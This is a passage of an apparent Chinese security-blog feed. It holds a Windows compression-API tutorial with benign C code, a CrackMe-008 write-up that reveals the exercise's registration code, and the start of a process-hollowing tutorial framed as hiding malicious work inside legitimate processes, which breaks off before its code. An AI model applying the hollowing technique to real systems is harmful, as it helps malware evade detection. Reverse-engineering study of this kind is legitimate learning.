class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vbnet">NT_RTL_COMPRESS_API NTSTATUS RtlCompressBuffer(<br>  <span class="hljs-type">USHORT</span> CompressionFormatAndEngine,<br>  PUCHAR UncompressedBuffer,<br>  <span class="hljs-type">ULONG</span>  UncompressedBufferSize,<br>  PUCHAR CompressedBuffer,<br>  <span class="hljs-type">ULONG</span>  CompressedBufferSize,<br>  <span class="hljs-type">ULONG</span>  UncompressedChunkSize,<br>  PULONG FinalCompressedSize,<br>  PVOID  WorkSpace<br>);<br></code></pre></div></td></tr></table></figure><p>CompressionFormatAndEngine：指定压缩格式和引擎类型的位掩码，此参数必须设置为一种格式类型和一种引擎类型的有效按位或组合。相关值得含义如下：</p><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>COMPRESSION_FORMAT_LZNT1</td><td>LZ压缩算法</td></tr><tr><td>COMPRESSION_FORMAT_XPRESS</td><td>Xpress压缩算法</td></tr><tr><td>COMPRESSION_FORMAT_XPRESS_HUFF</td><td>Huffman压缩算法</td></tr><tr><td>COMPRESSION_ENGINE_STANDARD</td><td>标准压缩算法</td></tr><tr><td>COMPRESSION_ENGINE_MAXIMUM</td><td>最大程序压缩</td></tr></tbody></table><p>UncompressedBuffer：指向要压缩的数据缓冲区的指针。该参数为必须不可为空。</p><p>UncompressedBufferSize：指定UncompressedBuffer缓冲区的大小</p><p>CompressedBuffer：指向压缩之后数据缓冲区的指针，用于接收压缩数据。该参数为必须的不可以为空。</p><p>CompressedBufferSize：指定CompressedBuffer缓冲区的大小。</p><p>UncompressedChunkSize：指定压缩UncompressedBuffer缓冲区时使用块的大小。该参数必须是以下值之一：512、1024、2048或者4096。操作系统使用4096，因此此参数推荐值也是、4096。</p><p>FinalCompressedSize</p><p>指向调用者分配变量的指针，该变量接收存储在CompressedBuffer中的压缩数据的大小。该参数为必须的，不能为NULL。</p><p>WorkSpace：在压缩期间指定由RtlCompressBuffer函数使用的调用者分配的工作空间缓冲区的指针。使用RtlGetCompressionWorkSpaceSize函数可以确定工作缓冲区的正确大小。</p><p>返回值：返回STATUS_SUNCCESS表示成功，否则失败。</p><h5 id="RtlDecompressBuffer"><a href="#RtlDecompressBuffer" class="headerlink" title="RtlDecompressBuffer"></a>RtlDecompressBuffer</h5><p>解压缩整个压缩缓冲区</p><figure class="highlight vbnet"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vbnet">NT_RTL_COMPRESS_API NTSTATUS RtlDecompressBuffer(<br>  <span class="hljs-type">USHORT</span> CompressionFormat,<br>  PUCHAR UncompressedBuffer,<br>  <span class="hljs-type">ULONG</span>  UncompressedBufferSize,<br>  PUCHAR CompressedBuffer,<br>  <span class="hljs-type">ULONG</span>  CompressedBufferSize,<br>  PULONG FinalUncompressedSize<br>);<br></code></pre></div></td></tr></table></figure><p>CompressionFormat：指定压缩缓冲区中压缩格式的位掩码。该参数必须设置为COMPRESSION_FORMAT_LZNT1。它和其他相关压缩格式的含义如下：</p><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>COMPRESSION_FORMAT_LZNT1</td><td>LZ压缩算法</td></tr><tr><td>COMPRESSION_FORMAT_XPRESS</td><td>Xpress压缩算法</td></tr></tbody></table><p>UncompressedBuffer：指向存储解压缩数据的缓冲区指针，该缓冲区从CompressedBuffer接收解压缩数据。该参数是必须的，不可以为NULL。</p><p>UncompressedBufferSize：指定UncompressedBuffer缓冲区的大小。</p><p>CompressedBuffer：指向要解压缩的数据缓冲区的指针。该参数是必须的不可以为空。</p><p>CompressedBufferSize：指定CompressedBuffer缓冲区的大小。</p><p>FinalUncompressedSize：指向解压之后得到的数据大小的指针，该变量接收在UncompressedBuffer中存储的解压缩数据的大小。该参数是必须的，不能为NULL。</p><p>返回值：返回STATUS_SUCCESS则表示成功，否则失败。</p><h4 id="编码实现"><a href="#编码实现" class="headerlink" title="编码实现"></a>编码实现</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function">BOOL <span class="hljs-title">CompressData</span><span class="hljs-params">(BYTE* pUnCompressData, DWORD dwUncompressDataLen, BYTE** ppCompressData, DWORD* pdwCompressDataLen)</span></span>;<br><span class="hljs-function">BOOL <span class="hljs-title">DeCompressData</span><span class="hljs-params">(BYTE* pCompressData, DWORD dwCompressDataLen, BYTE** ppUnCompressData, DWORD* pdwUncompressDataLen)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span> <span class="hljs-params">(WINAPI * FN_RtlGetCompressionWorkSpaceSize)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">USHORT CompressionFormatAndEngine,</span></span><br><span class="hljs-params"><span class="hljs-function">PULONG CompressBufferWorkSpaceSize,</span></span><br><span class="hljs-params"><span class="hljs-function">PULONG CompressFragmentWorkSpaceSize</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span> <span class="hljs-params">(WINAPI* FN_RtlCompressBuffer)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function"> USHORT CompressionFormatAndEngine,</span></span><br><span class="hljs-params"><span class="hljs-function"> PUCHAR UncompressedBuffer,</span></span><br><span class="hljs-params"><span class="hljs-function"> ULONG  UncompressedBufferSize,</span></span><br><span class="hljs-params"><span class="hljs-function"> PUCHAR CompressedBuffer,</span></span><br><span class="hljs-params"><span class="hljs-function"> ULONG  CompressedBufferSize,</span></span><br><span class="hljs-params"><span class="hljs-function"> ULONG  UncompressedChunkSize,</span></span><br><span class="hljs-params"><span class="hljs-function"> PULONG FinalCompressedSize,</span></span><br><span class="hljs-params"><span class="hljs-function"> PVOID  WorkSpace</span></span><br><span class="hljs-params"><span class="hljs-function"> )</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span> <span class="hljs-params">(WINAPI* FN_RtlDecompressBuffer)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">USHORT CompressionFormat,</span></span><br><span class="hljs-params"><span class="hljs-function">PUCHAR UncompressedBuffer,</span></span><br><span class="hljs-params"><span class="hljs-function">ULONG  UncompressedBufferSize,</span></span><br><span class="hljs-params"><span class="hljs-function">PUCHAR CompressedBuffer,</span></span><br><span class="hljs-params"><span class="hljs-function">ULONG  CompressedBufferSize,</span></span><br><span class="hljs-params"><span class="hljs-function">PULONG FinalUncompressedSize</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>DWORD i = <span class="hljs-number">0</span>;<br>BOOL flag = FALSE;<br><span class="hljs-keyword">char</span> buffer[] = <span class="hljs-string">&quot;b1ackie&quot;</span>;<br>DWORD dwBufferLen = <span class="hljs-built_in">strlen</span>(buffer);<br>BYTE* pCompressData = <span class="hljs-literal">NULL</span>;<br>DWORD dwCompreeDataLen = <span class="hljs-number">0</span>;<br>BYTE* pUnCompressData = <span class="hljs-literal">NULL</span>;<br>DWORD dwUnCompressDataLen = <span class="hljs-number">0</span>;<br>CompressData((BYTE*)buffer, dwBufferLen, &amp;pCompressData, &amp;dwCompreeDataLen);<br><br>DeCompressData(pCompressData, dwCompreeDataLen, &amp;pUnCompressData, &amp;dwUnCompressDataLen);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;原始数据：\n&quot;</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; dwBufferLen; i++) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x &quot;</span>, buffer[i]);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n加密后数据：\n&quot;</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; dwCompreeDataLen; i++) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x &quot;</span>, pCompressData[i]);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n解密后数据\n&quot;</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; dwUnCompressDataLen; i++) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x &quot;</span>, pUnCompressData[i]);<br>&#125;<br><span class="hljs-keyword">if</span> (pUnCompressData) <br>&#123;<br><span class="hljs-keyword">delete</span>[]pUnCompressData;<br>pUnCompressData = <span class="hljs-literal">NULL</span>;<br><br>&#125;<br><span class="hljs-keyword">if</span> (pCompressData)<br>&#123;<br><span class="hljs-keyword">delete</span>[]pCompressData;<br>pCompressData = <span class="hljs-literal">NULL</span>;<br>&#125;<br>getchar();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function">BOOL <span class="hljs-title">CompressData</span><span class="hljs-params">(BYTE* pUnCompressData, DWORD dwUncompressDataLen, BYTE** ppCompressData, DWORD* pdwCompressDataLen)</span></span><br><span class="hljs-function"></span>&#123;<br>BOOL flag = FALSE;<br>NTSTATUS status = <span class="hljs-number">0</span>;<br>DWORD dwWorkSpaceSize = <span class="hljs-number">0</span>;<br>DWORD dwFragmentWorkSpaceSize = <span class="hljs-number">0</span>;<br>BYTE* pWorkSpace = <span class="hljs-literal">NULL</span>;<br>BYTE* pCompressData = <span class="hljs-literal">NULL</span>;<br>DWORD dwCompressDataLen = <span class="hljs-number">4096</span>;<br>DWORD dwFinalCompressSize = <span class="hljs-number">0</span>;<br>HMODULE hDll = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">do</span><br>&#123;<br>hDll = LoadLibraryA(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br><span class="hljs-keyword">if</span> (hDll == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;加载NTDLL失败\n&quot;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>FN_RtlGetCompressionWorkSpaceSize RtlGetCompressionWorkSpaceSize = <br>(FN_RtlGetCompressionWorkSpaceSize)GetProcAddress(hDll, <span class="hljs-string">&quot;RtlGetCompressionWorkSpaceSize&quot;</span>);<br><span class="hljs-keyword">if</span> (RtlGetCompressionWorkSpaceSize == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取RtlGetCompressionWorkSpaceSize函数地址失败\n&quot;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>FN_RtlCompressBuffer RtlCompressBuffer = (FN_RtlCompressBuffer)GetProcAddress(hDll, <span class="hljs-string">&quot;RtlCompressBuffer&quot;</span>);<br><span class="hljs-keyword">if</span> (RtlCompressBuffer == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取RtlCompressBuffer地址失败\n&quot;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-comment">//获取WORKSPACE的大小</span><br>status = RtlGetCompressionWorkSpaceSize(COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_STANDARD, &amp;dwWorkSpaceSize, &amp;dwFragmentWorkSpaceSize);<br><span class="hljs-keyword">if</span> (status!=<span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取workspace大小失败\n&quot;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>pWorkSpace = <span class="hljs-keyword">new</span> BYTE[dwWorkSpaceSize];<br><span class="hljs-keyword">if</span> (pWorkSpace == <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1申请内存失败\n&quot;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>RtlZeroMemory(pWorkSpace, dwWorkSpaceSize);<br><span class="hljs-keyword">while</span> (TRUE) <br>&#123;<br>pCompressData = <span class="hljs-keyword">new</span> BYTE[dwCompressDataLen];<br><span class="hljs-keyword">if</span> (pCompressData == <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;2申请内存失败\n&quot;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>RtlZeroMemory(pCompressData, dwCompressDataLen);<br><span class="hljs-comment">//压缩数据</span><br>RtlCompressBuffer(COMPRESSION_FORMAT_LZNT1, pUnCompressData, dwUncompressDataLen, <br>pCompressData, dwCompressDataLen, <span class="hljs-number">4096</span>, &amp;dwFinalCompressSize, (PVOID)pWorkSpace);<br><br><span class="hljs-keyword">if</span> (dwCompressDataLen &lt; dwFinalCompressSize)<br>&#123;<br><span class="hljs-keyword">if</span> (pCompressData)<br>&#123;<br><span class="hljs-keyword">delete</span>[]pCompressData;<br>pCompressData = <span class="hljs-literal">NULL</span>;<br>&#125;<br>dwCompressDataLen = dwFinalCompressSize;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>*ppCompressData = pCompressData;<br>*pdwCompressDataLen = dwFinalCompressSize;<br>flag = TRUE;<br>&#125;<span class="hljs-keyword">while</span>(FALSE);<br><span class="hljs-keyword">if</span>(pWorkSpace)<br>&#123;<br><span class="hljs-keyword">delete</span>[]pWorkSpace;<br>pWorkSpace = <span class="hljs-literal">NULL</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (hDll)<br>&#123;<br>FreeLibrary(hDll);<br>&#125;<br><span class="hljs-keyword">return</span> flag;<br>&#125;<br><br><span class="hljs-function">BOOL <span class="hljs-title">DeCompressData</span><span class="hljs-params">(BYTE* pCompressData, DWORD dwCompressDataLen, BYTE** ppUnCompressData, DWORD* pdwUncompressDataLen)</span></span><br><span class="hljs-function"></span>&#123;<br>BOOL flag = FALSE;<br>HMODULE hDll = <span class="hljs-literal">NULL</span>;<br>BYTE* pUnCompressData = <span class="hljs-literal">NULL</span>;<br>DWORD dwUnCompressDataLen = <span class="hljs-number">4096</span>;<br>DWORD dwFinalUnCompressSize = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">do</span><br>&#123;<br>hDll = LoadLibraryA(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br><span class="hljs-keyword">if</span> (hDll == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;加载NTDLL失败\n&quot;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>FN_RtlDecompressBuffer RtlDecompressBuffer = (FN_RtlDecompressBuffer)GetProcAddress(hDll, <span class="hljs-string">&quot;RtlDecompressBuffer&quot;</span>);<br><span class="hljs-keyword">if</span> (RtlDecompressBuffer == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取RtlDecompressBuffer地址失败\n&quot;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">while</span> (TRUE)<br>&#123;<br>pUnCompressData = <span class="hljs-keyword">new</span> BYTE[dwUnCompressDataLen];<br><span class="hljs-keyword">if</span> (pUnCompressData == <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;3申请内存失败\n&quot;</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>RtlZeroMemory(pUnCompressData, dwUnCompressDataLen);<br>RtlDecompressBuffer(COMPRESSION_FORMAT_LZNT1, pUnCompressData, dwUnCompressDataLen, <br>pCompressData, dwCompressDataLen, &amp;dwFinalUnCompressSize);<br><span class="hljs-keyword">if</span> (dwUnCompressDataLen &lt; dwFinalUnCompressSize) <br>&#123;<br><span class="hljs-keyword">if</span> (pUnCompressData)<br>&#123;<br><span class="hljs-keyword">delete</span>[]pUnCompressData;<br>pUnCompressData = <span class="hljs-literal">NULL</span>;<br>&#125;<br>dwUnCompressDataLen = dwFinalUnCompressSize;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>*ppUnCompressData = pUnCompressData;<br>*pdwUncompressDataLen = dwFinalUnCompressSize;<br>flag = TRUE;<br><br>&#125; <span class="hljs-keyword">while</span> (FALSE);<br><span class="hljs-keyword">if</span> (hDll) &#123;<br>FreeLibrary(hDll);<br>&#125;<br><br><span class="hljs-keyword">return</span> flag;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><img src="/2021/08/06/%E5%8E%8B%E7%BC%A9%E6%8A%80%E6%9C%AF-windows%E5%8E%8B%E7%BC%A9API/1.png"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>《Windows黑客编程技术详解》</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;压缩技术&quot;&gt;&lt;a href=&quot;#压缩技术&quot; class=&quot;headerlink&quot; title=&quot;压缩技术&quot;&gt;&lt;/a&gt;压缩技术&lt;/h4&gt;&lt;p&gt;为了实现windows上的数据压缩和解压缩，最方便的方法就是直接调用win32API函数。windows系统的ntdll专门</summary>
      
    
    
    
    <category term="黑客编程" scheme="https://b1ackie.cn/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="恶意代码" scheme="https://b1ackie.cn/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    <category term="黑客编程" scheme="https://b1ackie.cn/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    <category term="压缩技术" scheme="https://b1ackie.cn/tags/%E5%8E%8B%E7%BC%A9%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>160CrackMe-008</title>
    <link href="https://b1ackie.cn/2021/08/04/160CrackMe-008/"/>
    <id>https://b1ackie.cn/2021/08/04/160CrackMe-008/</id>
    <published>2021-08-04T09:38:43.000Z</published>
    <updated>2021-08-09T10:54:15.567Z</updated>
    
    <content type="html"><![CDATA[<h4 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h4><p>打开程序直接输入一个注册码，输入错误弹出错误提示窗口。</p><p><img src="/2021/08/04/160CrackMe-008/1.png"></p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>无壳，是使用VB编写的的</p><p><img src="/2021/08/04/160CrackMe-008/2.png"></p><p>使用OD直接搜索错误弹窗的提示，可以直接定位一个关键跳转。</p><p><img src="/2021/08/04/160CrackMe-008/3.png"></p><p>开始分析一下，就在上面不远处，是明文比较输入与SynTaX 2oo1</p><p><img src="/2021/08/04/160CrackMe-008/4.png"></p><p>输入SynTaX 2oo1即可成功</p><p><img src="/2021/08/04/160CrackMe-008/5.png"></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>有点简单了。。。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;初探&quot;&gt;&lt;a href=&quot;#初探&quot; class=&quot;headerlink&quot; title=&quot;初探&quot;&gt;&lt;/a&gt;初探&lt;/h4&gt;&lt;p&gt;打开程序直接输入一个注册码，输入错误弹出错误提示窗口。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/08/04/160CrackMe-00</summary>
      
    
    
    
    <category term="CrackMe" scheme="https://b1ackie.cn/categories/CrackMe/"/>
    
    
    <category term="逆向工程" scheme="https://b1ackie.cn/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="CrackMe" scheme="https://b1ackie.cn/tags/CrackMe/"/>
    
  </entry>
  
  <entry>
    <title>隐藏技术-傀儡进程</title>
    <link href="https://b1ackie.cn/2021/08/03/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E5%82%80%E5%84%A1%E8%BF%9B%E7%A8%8B/"/>
    <id>https://b1ackie.cn/2021/08/03/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E5%82%80%E5%84%A1%E8%BF%9B%E7%A8%8B/</id>
    <published>2021-08-03T09:37:27.000Z</published>
    <updated>2021-08-09T10:52:31.783Z</updated>
    
    <content type="html"><![CDATA[<h4 id="傀儡进程"><a href="#傀儡进程" class="headerlink" title="傀儡进程"></a>傀儡进程</h4><p>借着正常的软件进程或者系统进程的外壳来进行恶意的操作。</p><h4 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h4><h5 id="GetThreadContext"><a href="#GetThreadContext" class="headerlink" title="GetThreadContext"></a>GetThreadContext</h5><p>检索指定线程的上下文</p><p>64位程序可以使用Wow64GetThreadContext检索WOW64线程的上下文。</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function">BOOL <span class="hljs-title">GetThreadContext</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  HANDLE    hThread,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCONTEXT lpContext</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure><p>hThread：要检索其上下文的线程的句柄。句柄必须有THREAD_GET_CONTEXT访问权限。</p><p>lpContext：指向上下文结构的指针，它接受指定线程适当的上下文。该结构中的ContextFlags成员可以指定检索线程上下文的哪些部分。上下文结构具有高度的处理器特性。</p><p>返回值：成功返回不为0，否则为0。</p><h5 id="SetThreadContext"><a href="#SetThreadContext" class="headerlink" title="SetThreadContext"></a>SetThreadContext</h5><p>设置指定线程的上下文。64位可以用Wow64SetThreadContext设置</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function">BOOL <span class="hljs-title">SetThreadContext</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  HANDLE        hThread,</span></span><br><span class="hljs-params"><span class="hljs-function">  <span class="hljs-keyword">const</span> CONTEXT *lpContext</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure><p>hThread：指定线程的句柄，并将设置其上下文。该句柄必须具有线程的THREAD_SET_CONTEXT权限。</p><p>lpContext：指向要在指定进程中设置上下文结构的指针。此结构中ContextFlags成员值可以指定要设置线程上下文的哪些部分。</p><p>返回值：如果设置了上下文，则返回值为非0，否则为0；</p><h5 id="ResumeThread"><a href="#ResumeThread" class="headerlink" title="ResumeThread"></a>ResumeThread</h5><p>减少线程的暂停计数。当暂停计数减到0时，恢复线程的执行。</p><figure class="highlight abnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs abnf">DWORD ResumeThread(<br>  HANDLE hThread<br>)<span class="hljs-comment">;</span><br></code></pre></div></td></tr></table></figure><p>hThread：要重新启动线程的句柄。该句柄必须具有THREAD_SUSPEND_RESUME权限。</p><p>返回值：如果成功，返回值是线程先前挂起的计数，如果失败，则返回（DWORD）-1。</p><h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 